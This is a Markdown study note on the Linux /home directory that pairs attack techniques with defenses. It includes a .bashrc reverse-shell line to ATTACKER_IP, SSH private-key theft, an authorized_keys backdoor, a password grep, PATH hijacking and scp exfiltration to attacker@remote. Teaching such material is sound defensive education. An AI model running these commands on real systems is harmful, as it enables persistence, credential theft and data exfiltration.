# 📁 home.md — The `/home` Directory 

## 🧠 What `/home` REALLY is

`/home` contains **user directories**

Each user gets a personal workspace:

```id="1p3k8x"
/home/ace
/home/john
/home/admin
```

---

## 🧠 What is stored here

Inside a user’s home directory:

* Personal files
* SSH keys
* Bash configs
* Application data
* Scripts

---

👉 `/home` = **user-controlled environment**

---

## 🧠 Why `/home` is IMPORTANT in Cybersecurity

Because:

* Users are the weakest link
* Most attacks start or expand here

---

👉 `/home` = **initial foothold + lateral movement zone**

---

# 🔐 KEY FILES INSIDE `/home`

---

## 1. `.bashrc` / `.bash_profile`

### What they are:

Shell startup scripts

---

### When do they run?

Every time a user opens terminal:

```bash id="n2q7zb"
bash
```

---

## 🔐 Attack: Persistence via `.bashrc`

### Step-by-step:

1. Attacker edits:

```id="1v9y7d"
/home/ace/.bashrc
```

2. Adds malicious line:

```bash id="c5m2wq"
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

### Result:

* Every time user opens terminal
* Reverse shell is triggered

---

👉 Persistent backdoor

---

## 🛡️ Defense

* Monitor `.bashrc`
* Check for unusual commands

---

## 2. `.ssh/` Directory

### Location:

```id="q6d2zs"
/home/ace/.ssh/
```

---

### Important files:

```id="3h7nkp"
id_rsa        # private key
id_rsa.pub    # public key
authorized_keys
```

---

## 🔐 Attack: SSH Key Theft

### Step-by-step:

1. Attacker reads:

```bash id="y4k2ph"
cat ~/.ssh/id_rsa
```

2. Copies private key

3. Uses it:

```bash id="f8m3qw"
ssh -i id_rsa ace@target
```

---

### Result:

* Password bypassed
* Silent access

---

## 🔐 Attack: Backdoor via `authorized_keys`

### Step-by-step:

1. Attacker adds key:

```bash id="t2m9kx"
echo "attacker_public_key" >> ~/.ssh/authorized_keys
```

---

### Result:

* Attacker can log in anytime
* No password needed

---

## 🛡️ Defense

* Restrict permissions:

```bash id="u7d9ql"
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

* Monitor changes

---

## 3. User Files (DATA TARGET)

### What attackers look for:

* Documents
* Password files
* Configs
* API keys

---

## 🔐 Attack: Credential Harvesting

```bash id="z9p2vc"
grep -r "password" /home
```

---

👉 Finds:

* Hardcoded passwords
* Secrets in files

---

## 🛡️ Defense

* Avoid storing secrets in plain text
* Encrypt sensitive data

---

# 🔐 ATTACK 1: PRIVILEGE ESCALATION FROM `/home`

## 🧠 Idea

Attacker gains low-level access (normal user)

👉 Uses `/home` to escalate

---

## ⚙️ Example

Check for sudo:

```bash id="r8m3np"
sudo -l
```

---

If user has permissions:

* Can run commands as root
* Escalation achieved

---

## 🧠 Why `/home` matters

* It’s where attacker starts
* It’s their working environment

---

# 🔐 ATTACK 2: MALICIOUS SCRIPTS

## ⚙️ Example

Attacker creates:

```bash id="k3t9wq"
echo "malicious code" > /home/ace/script.sh
chmod +x script.sh
```

---

Then tricks user:

```bash id="x6d8pl"
./script.sh
```

---

👉 Executes attacker code

---

## 🛡️ Defense

* Be careful running scripts
* Verify file sources

---

# 🔐 ATTACK 3: PATH HIJACKING FROM HOME

## ⚙️ Step-by-step

1. Attacker creates fake binary:

```bash id="q1w8ke"
echo "malicious" > /home/ace/ls
chmod +x /home/ace/ls
```

---

2. Modifies PATH:

```bash id="u4y6hz"
export PATH=/home/ace:$PATH
```

---

3. User runs:

```bash id="o7x9re"
ls
```

---

👉 Fake binary executes

---

## 🛡️ Defense

* Avoid adding home directory to PATH
* Use full paths

---

# 🔐 ATTACK 4: LATERAL MOVEMENT

## 🧠 Idea

Attacker moves between users

---

## ⚙️ Example

```bash id="p8r3nd"
ls /home
```

---

Finds:

```id="t4v2bm"
/home/admin
```

---

Attempts:

* Read files
* Steal keys
* Access other accounts

---

## 🔐 Impact

* Expand control
* Reach privileged users

---

## 🛡️ Defense

* Proper permissions
* Isolate user data

---

# 🔐 ATTACK 5: DATA EXFILTRATION

## ⚙️ Example

```bash id="y8w3pk"
tar czf /tmp/data.tar.gz /home/ace
```

---

Then:

```bash id="f3q9rl"
scp data.tar.gz attacker@remote:
```

---

👉 Data stolen

---

## 🛡️ Defense

* Monitor outbound traffic
* Detect large transfers

---

# ⚠️ WHY `/home` IS CRITICAL

Because it contains:

* User identity
* Credentials
* Personal data
* Entry points for attacks

---

👉 It is the **human layer of the system**

---

# 🛡️ DEFENSE STRATEGY

---

## 1. Secure Permissions

```bash id="c6m2zx"
chmod 700 /home/ace
```

---

## 2. Monitor `.ssh`

* Detect unauthorized keys
* Audit access

---

## 3. Audit Startup Files

```bash id="d2n8vx"
cat ~/.bashrc
```

---

## 4. Detect Suspicious Scripts

```bash id="h9k3qv"
find /home -type f -executable
```

---

## 5. Educate Users

* Avoid running unknown scripts
* Use strong passwords

---

# 🧪 RECON COMMANDS

```bash id="m7q2lb"
ls -la /home
ls -la /home/ace
cat ~/.bashrc
ls -la ~/.ssh
find /home -type f -perm -4000 2>/dev/null
```

---

# 🧠 FINAL MENTAL MODEL

* `/home` = user territory
* Users = weakest link
* Weak link = entry point

---

# 📌 FINAL TRUTH

If attacker controls `/home`:

* They can steal credentials
* They can persist silently
* They can escalate privileges
* They can move across users

👉 `/home` = **entry point + expansion zone**
